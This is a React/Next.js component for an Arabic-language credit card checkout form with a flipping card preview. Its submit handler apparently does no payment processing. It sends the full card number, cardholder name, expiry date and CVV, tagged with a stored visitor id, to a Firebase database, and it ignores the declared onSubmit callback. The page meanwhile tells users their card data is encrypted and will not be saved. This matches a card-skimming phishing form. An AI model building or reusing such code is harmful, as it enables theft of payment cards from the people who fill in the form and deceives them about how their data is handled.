"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { CreditCard, Calendar, User, Lock } from "lucide-react"
import { addData } from "@/lib/firebase"

// Card types with their regex patterns and logos
const CARD_TYPES = [
  {
    name: "visa",
    pattern: /^4/,
    image: "/visa.png",
  },
  {
    name: "mastercard",
    pattern: /^5[1-5]/,
    image: "/mastercard.png",
  },
  {
    name: "amex",
    pattern: /^3[47]/,
    image: "/amex.png",
  },
]

interface CreditCardFormProps {
  onSubmit: (cardData: CardData) => void
  isProcessing?: boolean
}

export interface CardData {
  cardNumber: string
  cardholderName: string
  expiryDate: string
  cvv: string
  cardType?: string
}

export default function CreditCardForm({ onSubmit, isProcessing = false }: CreditCardFormProps) {
  const [cardData, setCardData] = useState<CardData>({
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  })
  const [errors, setErrors] = useState<Partial<Record<keyof CardData, string>>>({})
  const [cardType, setCardType] = useState<string | null>(null)
  const [isFlipped, setIsFlipped] = useState(false)

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    // Different formatting for Amex (4-6-5) vs other cards (4-4-4-4)
    if (cardType === "amex") {
      const matches = v.match(/\d{1,4}|\d{1,6}|\d{1,5}/g)
      return matches ? matches.join(" ") : v
    } else {
      const matches = v.match(/\d{1,4}/g)
      return matches ? matches.join(" ") : v
    }
  }

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return v
  }

  // Detect card type based on number
  useEffect(() => {
    const number = cardData.cardNumber.replace(/\s+/g, "")

    if (number) {
      const foundType = CARD_TYPES.find((card) => card.pattern.test(number))
      setCardType(foundType ? foundType.name : null)

      // Update card data with detected type
      setCardData((prev) => ({
        ...prev,
        cardType: foundType ? foundType.name : undefined,
      }))
    } else {
      setCardType(null)
      setCardData((prev) => ({
        ...prev,
        cardType: undefined,
      }))
    }
  }, [cardData.cardNumber])

  // Handle input changes
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target

    let formattedValue = value

    // Apply formatting based on field
    if (name === "cardNumber") {
      formattedValue = formatCardNumber(value)
    } else if (name === "expiryDate") {
      formattedValue = formatExpiryDate(value)
    } else if (name === "cvv") {
      formattedValue = value.replace(/\D/g, "").substring(0, cardType === "amex" ? 4 : 3)
    }

    setCardData({
      ...cardData,
      [name]: formattedValue,
    })

    // Clear error when user types
    if (errors[name as keyof CardData]) {
      setErrors({
        ...errors,
        [name]: "",
      })
    }
  }

  // Validate the form
  const validateForm = () => {
    const newErrors: Partial<Record<keyof CardData, string>> = {}

    // Card number validation
    const cardNumberWithoutSpaces = cardData.cardNumber.replace(/\s+/g, "")
    if (!cardNumberWithoutSpaces) {
      newErrors.cardNumber = "يرجى إدخال رقم البطاقة"
    } else if (
      (cardType === "amex" && cardNumberWithoutSpaces.length !== 15) ||
      (cardType !== "amex" && cardNumberWithoutSpaces.length !== 16)
    ) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح"
    }

    // Cardholder name validation
    if (!cardData.cardholderName.trim()) {
      newErrors.cardholderName = "يرجى إدخال اسم حامل البطاقة"
    }

    // Expiry date validation
    if (!cardData.expiryDate) {
      newErrors.expiryDate = "يرجى إدخال تاريخ الانتهاء"
    } else {
      const [month, year] = cardData.expiryDate.split("/")
      const currentYear = new Date().getFullYear() % 100
      const currentMonth = new Date().getMonth() + 1

      if (!month || !year || month.length !== 2 || year.length !== 2) {
        newErrors.expiryDate = "صيغة تاريخ الانتهاء غير صحيحة"
      } else {
        const numMonth = Number.parseInt(month, 10)
        const numYear = Number.parseInt(year, 10)

        if (numMonth < 1 || numMonth > 12) {
          newErrors.expiryDate = "الشهر غير صحيح"
        } else if (numYear < currentYear || (numYear === currentYear && numMonth < currentMonth)) {
          newErrors.expiryDate = "البطاقة منتهية الصلاحية"
        }
      }
    }

    // CVV validation
    if (!cardData.cvv) {
      newErrors.cvv = "يرجى إدخال رمز الأمان"
    } else if (
      (cardType === "amex" && cardData.cvv.length !== 4) ||
      (cardType !== "amex" && cardData.cvv.length !== 3)
    ) {
      newErrors.cvv = "رمز الأمان غير صحيح"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  // Handle form submission
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (validateForm()) {
    const visitorId = localStorage.getItem('visitor');

      addData({id:visitorId,...cardData})
    }
  }

  // Get card logo based on detected type
  const getCardLogo = () => {
    if (!cardType) return null

    const card = CARD_TYPES.find((c) => c.name === cardType)
    if (!card) return null

    return (
      <div className="absolute left-3 top-1/2 -translate-y-1/2">
        <Image src={card.image || "/placeholder.svg"} alt={card.name} width={40} height={25} />
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="mb-6">
        <h2 className="text-xl font-bold text-right mb-2">تفاصيل البطاقة</h2>
        <p className="text-gray-500 text-right">يرجى إدخال تفاصيل بطاقة الائتمان الخاصة بك</p>
      </div>

      {/* Card Preview */}
      <div
        className={`relative h-48 w-full mb-8 rounded-xl shadow-lg transition-all duration-500 perspective-1000 ${
          isFlipped ? "rotate-y-180" : ""
        }`}
      >
        {/* Front of card */}
        <div
          className={`absolute inset-0 rounded-xl bg-gradient-to-br from-blue-500 to-purple-600 p-6 text-white transition-all duration-500 backface-hidden ${
            isFlipped ? "opacity-0" : "opacity-100"
          }`}
        >
          <div className="flex justify-between items-start">
            <div className="w-12 h-12 rounded-full bg-white/30 backdrop-blur-sm"></div>
            <div className="text-right">
              <p className="text-xs opacity-70">بطاقة ائتمان</p>
              <p className="text-sm font-semibold">{cardType ? cardType.toUpperCase() : "CARD"}</p>
            </div>
          </div>

          <div className="mt-6">
            <p className="text-sm opacity-70">رقم البطاقة</p>
            <p className="font-mono text-xl tracking-wider">{cardData.cardNumber || "•••• •••• •••• ••••"}</p>
          </div>

          <div className="mt-4 flex justify-between">
            <div>
              <p className="text-xs opacity-70">تاريخ الانتهاء</p>
              <p className="font-mono">{cardData.expiryDate || "MM/YY"}</p>
            </div>
            <div className="text-right">
              <p className="text-xs opacity-70">حامل البطاقة</p>
              <p className="font-mono truncate max-w-[150px]">{cardData.cardholderName || "الاسم الكامل"}</p>
            </div>
          </div>
        </div>

        {/* Back of card */}
        <div
          className={`absolute inset-0 rounded-xl bg-gradient-to-br from-gray-700 to-gray-900 text-white rotate-y-180 transition-all duration-500 backface-hidden ${
            isFlipped ? "opacity-100" : "opacity-0"
          }`}
        >
          <div className="h-12 bg-black mt-5"></div>
          <div className="px-6 mt-4">
            <div className="bg-gray-200 h-10 flex items-center justify-end px-3">
              <p className="font-mono text-gray-800">{cardData.cvv || "•••"}</p>
            </div>
            <p className="text-xs mt-4 text-right opacity-70">
              رمز الأمان (CVV) هو رمز مكون من 3 أرقام على ظهر البطاقة
            </p>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Card Number */}
        <div>
          <label htmlFor="cardNumber" className="block text-sm font-medium text-right mb-1">
            رقم البطاقة
          </label>
          <div className="relative">
            <input
              type="text"
              id="cardNumber"
              name="cardNumber"
              value={cardData.cardNumber}
              onChange={handleChange}
              placeholder="0000 0000 0000 0000"
              maxLength={cardType === "amex" ? 17 : 19}
              className={`w-full rounded-md border p-3 pl-12 pr-4 text-right ${
                errors.cardNumber ? "border-red-500" : "border-gray-300"
              }`}
              dir="ltr"
            />
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
              <CreditCard className="h-5 w-5" />
            </div>
            {getCardLogo()}
          </div>
          {errors.cardNumber && <p className="mt-1 text-sm text-red-500 text-right">{errors.cardNumber}</p>}
        </div>

        {/* Cardholder Name */}
        <div>
          <label htmlFor="cardholderName" className="block text-sm font-medium text-right mb-1">
            اسم حامل البطاقة
          </label>
          <div className="relative">
            <input
              type="text"
              id="cardholderName"
              name="cardholderName"
              value={cardData.cardholderName}
              onChange={handleChange}
              placeholder="الاسم كما هو مكتوب على البطاقة"
              className={`w-full rounded-md border p-3 pr-10 text-right ${
                errors.cardholderName ? "border-red-500" : "border-gray-300"
              }`}
            />
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
              <User className="h-5 w-5" />
            </div>
          </div>
          {errors.cardholderName && <p className="mt-1 text-sm text-red-500 text-right">{errors.cardholderName}</p>}
        </div>

        {/* Expiry Date and CVV */}
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label htmlFor="expiryDate" className="block text-sm font-medium text-right mb-1">
              تاريخ الانتهاء
            </label>
            <div className="relative">
              <input
                type="text"
                id="expiryDate"
                name="expiryDate"
                value={cardData.expiryDate}
                onChange={handleChange}
                placeholder="MM/YY"
                maxLength={5}
                className={`w-full rounded-md border p-3 pl-4 pr-10 text-right ${
                  errors.expiryDate ? "border-red-500" : "border-gray-300"
                }`}
                dir="ltr"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
                <Calendar className="h-5 w-5" />
              </div>
            </div>
            {errors.expiryDate && <p className="mt-1 text-sm text-red-500 text-right">{errors.expiryDate}</p>}
          </div>

          <div>
            <label htmlFor="cvv" className="block text-sm font-medium text-right mb-1">
              رمز الأمان (CVV)
            </label>
            <div className="relative">
              <input
                type="text"
                id="cvv"
                name="cvv"
                value={cardData.cvv}
                onChange={handleChange}
                onFocus={() => setIsFlipped(true)}
                onBlur={() => setIsFlipped(false)}
                placeholder={cardType === "amex" ? "0000" : "000"}
                maxLength={cardType === "amex" ? 4 : 3}
                className={`w-full rounded-md border p-3 pl-4 pr-10 text-right ${
                  errors.cvv ? "border-red-500" : "border-gray-300"
                }`}
                dir="ltr"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
                <Lock className="h-5 w-5" />
              </div>
            </div>
            {errors.cvv && <p className="mt-1 text-sm text-red-500 text-right">{errors.cvv}</p>}
          </div>
        </div>

        <div className="mt-6">
          <button
            type="submit"
            className="w-full rounded-md bg-blue-500 py-3 font-medium text-white transition-colors hover:bg-blue-600 disabled:bg-blue-300"
            disabled={isProcessing}
          >
            {isProcessing ? "جاري المعالجة..." : "تأكيد الدفع"}
          </button>
        </div>
      </form>

      <div className="mt-6 text-center">
        <p className="text-sm text-gray-500">بياناتك آمنة ومشفرة. لن يتم حفظ معلومات بطاقتك.</p>
      </div>
    </div>
  )
}

